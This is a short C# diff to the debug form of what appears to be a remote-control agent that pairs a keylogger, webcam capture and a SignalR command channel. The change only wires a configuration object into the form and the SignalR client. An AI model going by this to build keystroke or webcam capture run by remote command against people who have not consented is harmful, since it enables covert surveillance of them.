@@ -18,6 +18,7 @@ public class AgentDebugForm : Form
     private readonly WebCamService _webCamService;
     private readonly KeyLoggerService _keyLoggerService;
     private readonly SignalRClientService _signalRService;
+    private readonly Microsoft.Extensions.Configuration.IConfiguration _configuration;
 
     // Dashboard
     private Label _lblCpu, _lblRam, _lblUptime, _lblProcessCount;
@@ -40,14 +41,15 @@ public class AgentDebugForm : Form
     private Button _btnStartKeyLog, _btnStopKeyLog;
     private System.Windows.Forms.Timer _logTimer;
 
-    public AgentDebugForm()
+    public AgentDebugForm(Microsoft.Extensions.Configuration.IConfiguration configuration)
     {
+        _configuration = configuration;
         _commandHandler = new CommandHandler();
         _webCamService = new WebCamService();
         _keyLoggerService = new KeyLoggerService();
         
         // Init SignalR
-        _signalRService = new SignalRClientService(_commandHandler);
+        _signalRService = new SignalRClientService(_commandHandler, _configuration);
         _signalRService.OnStatusChanged += (msg) => this.Invoke(() => UpdateStatus(msg));
         _signalRService.OnConnectionStateChanged += (state) => this.Invoke(() => 
         {
